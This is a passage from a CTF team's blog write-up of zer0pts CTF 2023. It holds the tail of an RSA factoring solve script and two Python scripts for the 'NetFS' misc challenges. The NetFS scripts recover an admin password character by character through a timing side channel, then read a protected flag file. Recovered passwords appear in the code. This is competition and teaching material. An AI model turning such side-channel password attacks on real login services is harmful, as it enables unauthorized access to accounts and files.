</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sot</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ps</span> <span class=o>=</span> <span class=n>factor</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span><span class=p>,</span><span class=n>n0</span> <span class=o>=</span> <span class=p>[(</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)],</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>ps</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>ps</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>n</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>a</span><span class=p>,</span> <span class=n>b</span> <span class=o>=</span> <span class=n>j</span>
</span></span><span class=line><span class=cl>                <span class=n>c</span><span class=p>,</span> <span class=n>d</span> <span class=o>=</span> <span class=n>two_squares</span><span class=p>(</span><span class=n>ps</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>a</span> <span class=o>*</span> <span class=n>c</span> <span class=o>+</span> <span class=n>b</span> <span class=o>*</span> <span class=n>d</span><span class=p>,</span> <span class=n>a</span> <span class=o>*</span> <span class=n>d</span> <span class=o>-</span> <span class=n>b</span> <span class=o>*</span> <span class=n>c</span><span class=p>)</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>n0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>n0</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>a</span> <span class=o>*</span> <span class=n>c</span> <span class=o>+</span> <span class=n>b</span> <span class=o>*</span> <span class=n>d</span><span class=p>,</span> <span class=n>a</span> <span class=o>*</span> <span class=n>d</span> <span class=o>-</span> <span class=n>b</span> <span class=o>*</span> <span class=n>c</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>d</span><span class=p>,</span> <span class=n>c</span> <span class=o>=</span> <span class=n>two_squares</span><span class=p>(</span><span class=n>ps</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>a</span> <span class=o>*</span> <span class=n>c</span> <span class=o>+</span> <span class=n>b</span> <span class=o>*</span> <span class=n>d</span><span class=p>,</span> <span class=n>a</span> <span class=o>*</span> <span class=n>d</span> <span class=o>-</span> <span class=n>b</span> <span class=o>*</span> <span class=n>c</span><span class=p>)</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>n0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>n0</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>a</span> <span class=o>*</span> <span class=n>c</span> <span class=o>+</span> <span class=n>b</span> <span class=o>*</span> <span class=n>d</span><span class=p>,</span> <span class=n>a</span> <span class=o>*</span> <span class=n>d</span> <span class=o>-</span> <span class=n>b</span> <span class=o>*</span> <span class=n>c</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>n</span><span class=p>,</span><span class=n>n0</span><span class=o>=</span><span class=n>n0</span><span class=p>,[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>p</span><span class=p>,</span><span class=n>q</span> <span class=ow>in</span> <span class=n>n</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>isPrime</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=ow>and</span> <span class=n>isPrime</span><span class=p>(</span><span class=n>q</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>p</span> <span class=p>,</span><span class=n>q</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;crypto.2023.zer0pts.com&#39;</span><span class=p>,</span><span class=mi>10333</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;N:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>N</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>,</span><span class=n>q</span> <span class=o>=</span> <span class=n>sot</span><span class=p>(</span><span class=n>N</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=n>q</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;p: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>p</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;q: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>q</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=misc>Misc</h2><h3 id=netfs-1>NetFS 1</h3><p>guest/guest账户可看/home/ctf/public/welcome.txt但
File: /home/ctf/secret/flag.txt
Permission denied.
用侧信道脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=s2>&#34;1234567890abcdef</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;connecting&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s1>&#39;misc.2023.zer0pts.com&#39;</span><span class=p>,</span><span class=mi>10021</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;connected&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;admin</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;dd79efc4093c9326&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>i</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=netfs2>NetFS2</h3><p>增加了延时，不能手动挡了，也是侧信道</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test</span><span class=p>(</span><span class=n>passwd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=s2>&#34;1234567890abcdef</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s1>&#39;misc2.2023.zer0pts.com&#39;</span><span class=p>,</span> <span class=mi>10022</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=c1># s.connect((&#39;docker&#39;, 6666))</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;admin</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>passwd</span> <span class=o>!=</span> <span class=s2>&#34;&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>passwd</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>i</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;x&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>passwd</span> <span class=o>+=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>passwd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>passwd</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>readflag</span><span class=p>(</span><span class=n>passwd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s1>&#39;misc2.2023.zer0pts.com&#39;</span><span class=p>,</span> <span class=mi>10022</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;admin</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>passwd</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/home/ctf/secret/flag.txt</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># passwd = &#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># for i in range(32):</span>
</span></span><span class=line><span class=cl><span class=c1>#     passwd = test(passwd)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>readflag</span><span class=p>(</span><span class=s2>&#34;02872f5ae0819d2f&#34;</span><span class=p>)</span> <span class=c1>#读取flag</span>
</span></span></code></pre></td></tr></table></div></div><div class=blog-tags><a href=https://su-team.cn/tags/otherctf/>OtherCTF</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/tfcctf-2025-su-wu/>2025 TFCCTF SU WriteUp</a></li><li><a href=/post/xhlj-2021-su-wu/>2021年西湖论剑线上赛 SU Write-up</a></li><li><a href=/post/gxzyctf-2020-su-wu/>高校战“疫”网络安全分享赛 2020 SU Write Up</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/xctffinals-2023-su-wu/ data-toggle=tooltip data-placement=top title="2023 XCTFfinals SU Writeup">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/wmctf-2023-su-wu/ data-toggle=tooltip data-placement=top title="2023 WMCTF SU Write-Up">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>